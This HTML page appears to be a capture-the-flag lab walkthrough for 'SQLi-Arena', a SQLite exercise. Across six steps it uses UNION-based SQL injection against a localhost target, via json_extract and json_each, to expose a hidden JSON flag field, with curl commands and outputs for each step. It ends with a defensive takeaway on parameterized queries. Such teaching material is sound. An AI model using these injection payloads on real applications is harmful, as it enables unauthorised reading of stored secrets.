<h4>Step 1: Understand the Normal Query</h4>
<p>The query extracts only <code>$.version</code> and <code>$.debug</code> from the JSON config. The flag field is hidden.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Config View</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=1"<br>
        <span class="prompt">SQL: </span>SELECT id, json_extract(config_json, '$.version') AS version, json_extract(config_json, '$.debug') AS debug FROM app_config WHERE id = 1<br><br>
        <span class="prompt">Output:</span><br>
        id | version | debug<br>
        1 | 2.0 | 0<br><br>
        <span class="prompt">// Only version and debug displayed -- flag field is filtered out</span>
    </div>
</div>

<h4>Step 2: Extract Raw JSON via UNION</h4>
<p>Use UNION injection to bypass the json_extract filter and read the full JSON blob.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Raw JSON Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, config_json, 3 FROM app_config WHERE id=1"<br><br>
        <span class="prompt">Output:</span><br>
        id | version | debug<br>
        1 | {"debug":false,<strong>"flag":"FLAG{sq_js0n_3xtr4ct_1nj}"</strong>,"version":"2.0"} | 3<br><br>
        <span class="prompt">// Full JSON visible -- the hidden "flag" field is exposed!</span>
    </div>
</div>

<h4>Step 3: Clean Extraction with json_extract() and $.flag</h4>
<p>Use <code>json_extract()</code> with the <code>$.flag</code> path to get just the flag value.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3: json_extract with $.flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, json_extract((SELECT config_json FROM app_config WHERE id=1), '$.flag'), 3"<br><br>
        <span class="prompt">Output:</span><br>
        id | version | debug<br>
        1 | <strong>FLAG{sq_js0n_3xtr4ct_1nj}</strong> | 3
    </div>
</div>

<h4>Step 4: Enumerate All JSON Keys with json_each()</h4>
<p>Use the <code>json_each()</code> table-valued function to discover all keys in the JSON object without knowing the schema.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4: json_each() Key-Value Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT key, value, type FROM json_each((SELECT config_json FROM app_config WHERE id=1))"<br><br>
        <span class="prompt">Output:</span><br>
        id | version | debug<br>
        debug | 0 | false<br>
        flag | <strong>FLAG{sq_js0n_3xtr4ct_1nj}</strong> | text<br>
        version | 2.0 | text
    </div>
</div>

<h4>Step 5: Alternative. Direct json_secrets Table</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5: json_secrets Table</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT id, secret_data, 'found' FROM json_secrets"<br><br>
        <span class="prompt">Output:</span><br>
        id | version | debug<br>
        1 | <strong>FLAG{sq_js0n_3xtr4ct_1nj}</strong> | found
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_js0n_3xtr4ct_1nj}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab9" \<br> --data-urlencode "id=0 UNION SELECT 1, json_extract((SELECT config_json FROM app_config WHERE id=1), '$.flag'), 3"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> SQLite's JSON1 extension provides powerful functions:
    <code>json_extract(json, '$.path')</code> reads specific fields,
    <code>json_each(json)</code> enumerates all key-value pairs as a virtual table,
    <code>json_type()</code> returns the JSON type of a value. Filtering sensitive fields in
    the query (only extracting $.version and $.debug) does not prevent an attacker from using
    UNION injection to read the raw JSON or different paths. Store sensitive data separately
    from user-facing JSON objects, and always use parameterized queries.
</div>
